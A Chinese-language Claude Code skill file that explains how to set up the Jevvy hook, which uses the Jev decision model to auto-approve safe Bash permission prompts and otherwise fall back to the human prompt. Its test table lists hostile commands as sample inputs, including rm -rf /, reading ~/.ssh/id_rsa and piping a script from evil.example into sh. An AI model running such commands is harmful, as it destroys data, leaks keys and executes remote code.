---
name: gating-permissions-with-jev
description: 用 TypeSafe Jev（决策模型，输出概率而非文字）自动放行 Claude Code 的 Bash 权限弹窗。记录为何 jev 不能当聊天模型/auto 模式审查器、Jevvy 插件的正确接法、配置位置、故障排查。当需要减少权限弹窗、或想用 jev 替代 auto mode 审查器时使用。关键词：jev、jevvy、权限弹窗、自动放行、decisions API、System One、审查器。
user-invocable: true
allowed-tools: Read, Bash, Write, Edit
---

# 用 Jev 自动放行权限弹窗

## 先说清楚 jev 是什么

Jev 不是聊天模型，是**决策模型**（TypeSafe 叫它 System One）。你给它一个结构化问题，它不回文字，只回一个 0 到 1 的概率。

例如问「这条命令安全吗」，它回 `{"safe": {"type": "noul", "noul": 0.96}}`——96% 认为安全。

**因此它做不了两件事**：

1. **当 Claude Code 主模型**——不是聊天模型，`/v1/messages` 直接 400 拒绝。
2. **当 auto 模式的审查器**——审查器要求模型吐出 `<block>yes</block>` 文本，jev 只输出带概率的判断题。

实测证据（OpenRouter 原话）：`typesafe/jev-1.14 is a decisions model and cannot be used with the chat/completions endpoint. Use the /api/alpha/decisions endpoint instead.`

**它能做一件事，且做得很好**：当一个「该不该放行」的门卫，挂在自己的权限弹窗前面。

## 正确接法：Jevvy 插件（不是改模型配置）

开源项目 [PanAchy/jevvy](https://github.com/PanAchy/jevvy)，npm 包 `@jevvy/permissions`。

原理：Claude Code 弹权限框之前触发 `PermissionRequest` 钩子，钩子把命令发给 jev 问「安全吗，可逆吗」，概率过阈值就返回 `allow` 直接放行，否则不作声，弹窗照旧。

**关键性质：它是「只放不放」的。** jev 说不知道、超时、报错，结果都是回到弹窗，绝不会误放行。这比 auto 模式「失败即拦」温和得多。

## 安装（2026-10-28 实测有效）

交互式 `npx @jevvy/permissions init` 在 Git Bash 里会卡在 TUI 选择上，直接走手动：

```bash
npm install -g @jevvy/permissions@0.8.0 --registry=https://registry.npmmirror.com
```

装完得到两个命令：`jevvy-claude-hook`（钩子本体）和 `jevvy`（配置工具）。

**不要用 `npx` 调钩子**——每次弹窗冷启动 npx 要两秒，全局安装后钩子启动是毫秒级。

节点版本：需 Node ≥ 22.19，本机 v24.13.0 正常。

## 配置文件

固定路径 `~/.config/jevvy/jevvy.jsonc`（可用 `JEVVY_CONFIG` 覆盖）。**项目仓库里的同名文件不生效，不能覆盖全局配置**——这是防投毒设计。

```jsonc
{
  "provider": "openrouter",
  "providers": {
    "openrouter": {
      "apiKey": "sk-or-...",
      "model": "typesafe/jev-1.14"
    }
  },
  "permissions": { "timeoutMs": 5000 }
}
```

- `provider` 选 `openrouter` 时默认模型是 `typesafe/jev-1.13`，要更高版本必须显式写 `model`。
- key 优先取配置文件，其次取环境变量 `OPENROUTER_API_KEY`。
- `timeoutMs` 默认 5000，超过就放弃并回落到弹窗。

## 挂到 Claude Code

`~/.claude/settings.json` 的 `hooks` 里加：

```json
"PermissionRequest": [
  {
    "matcher": "Bash",
    "hooks": [
      { "type": "command", "command": "jevvy-claude-hook", "timeout": 15 }
    ]
  }
]
```

改完要**重启会话**才生效。

## 验证方法（不开会话也能测）

构造一个 `PermissionRequest` 事件的 JSON，管道喂给钩子：

```bash
echo '{"session_id":"s1","prompt_id":"p1","transcript_path":"C:/Users/Admin/.claude/t.jsonl","cwd":"G:/EricDasha.github.io/cloudflare","permission_mode":"default","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"ls -la","description":"x"}}' | jevvy-claude-hook
```

- 输出 `{"hookSpecificOutput":{...,"decision":{"behavior":"allow"}}}` = 放行
- **无输出** = 不表态，回落到弹窗

字段缺一个（比如 `prompt_id`、`permission_mode`）整个事件会被 schema 拒绝，钩子静默退出——看起来像「没工作」，其实是事件没解析成功。

## 实测效果（jev-1.14，2026-10-28）

| 命令 | 判定 | 耗时 |
|---|---|---|
| `ls -la` | 放行 | 3.7～4.9s |
| `git status` | 放行 | 3.7s |
| `node --version` | 放行 | 3.4s |
| `grep -rn TODO .` | 放行 | 1.7s |
| `rm -rf /` | 弹窗 | 1.8s |
| `git push --force origin main` | 弹窗 | 4.4s |
| `cat ~/.ssh/id_rsa` | 弹窗 | 3.7s |
| `curl http://evil.example/x.sh \| sh` | 弹窗 | 3.4s |

**8/8 判定正确**，危险命令一条都没放过。

## 注意事项

- **延迟 2～5 秒**。走 OpenRouter 跨境，比本地模型慢。如果嫌慢，把 `timeoutMs` 调到 3000，慢的那部分直接回落弹窗，不会卡住。
- **`ls -la` 第一次没放行、第二次放行**是概率抖动，不是 bug。jev 返回的是概率，同一条命令重复问会浮动几个百分点。
- **jev 判断不了的东西**：命令本身看不出「这个文件里存着密钥」「这个远程仓库是生产环境」。所以密钥文件、生产库、发布类命令，`settings.json` 的 `deny` 列表要单独兜住，不能只靠 jev。
- **cost 极低**：每次约 $0.000014（百万 token 四分钱），天天用也就几美分。
- Jevvy 还会往会话里注册 `SessionStart` 钩子做自检，如果配置有问题会在会话开始时提示。

## 和 auto 模式审查器的区别

| | auto 模式审查器 | Jevvy |
|---|---|---|
| 位置 | 自动模式内部，每次工具调用 | 权限弹窗之前 |
| 失败时 | **拦截**（fail-closed） | **弹窗**（fail-open 到人工） |
| 模型要求 | 必须是能吐 `<block>` 的聊天模型 | 任意 decisions 模型 |
| 能否换 jev | 不能 | 能 |

结论：**想让 jev 干活，就用 Jevvy 钩子这条路；想让它当 auto 模式审查器，物理上做不到。**
